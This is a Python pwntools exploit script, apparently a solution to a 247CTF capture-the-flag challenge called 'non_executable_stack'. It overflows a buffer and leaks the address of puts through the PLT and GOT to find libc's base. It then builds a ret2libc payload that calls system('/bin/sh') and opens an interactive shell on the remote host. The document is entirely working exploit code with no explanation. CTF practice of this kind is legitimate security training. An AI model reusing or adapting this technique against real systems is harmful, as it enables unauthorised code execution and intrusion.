from pwn import *

elf = ELF("non_executable_stack")
libc = ELF("libc6-i386_2.27-3ubuntu1_amd64.so")
host = 'dc85c1b3fec97e87.247ctf.com'
port = 50422
r = remote(host, port)
offset = 44

log.info("leaking puts address...")
payload = b'A' * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
r.sendlineafter("password:\n", payload)
r.recvuntil("Incorrect secret password!\n")
puts = u32(r.recv(4))
log.info("puts leaked")
log.success("puts --> %s\n\n" % hex(puts))

log.info("leaking libc_base...")
libc_base = puts - libc.sym['puts']
log.info("libc_base leaked")
log.success("libc_base --> %sn\n\n" % hex(libc_base))

log.info("computing system and bin_sh address...")
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
log.info("done")
log.success("system --> %s" % hex(system))
log.success("bin_sh --> %sn\n\n" % hex(bin_sh))

payload = b'A' * offset
payload += p32(system)
payload += b'AAAA'
payload += p32(bin_sh)
r.sendlineafter("\n", payload)
r.recvuntil("password!\n")
r.interactive()
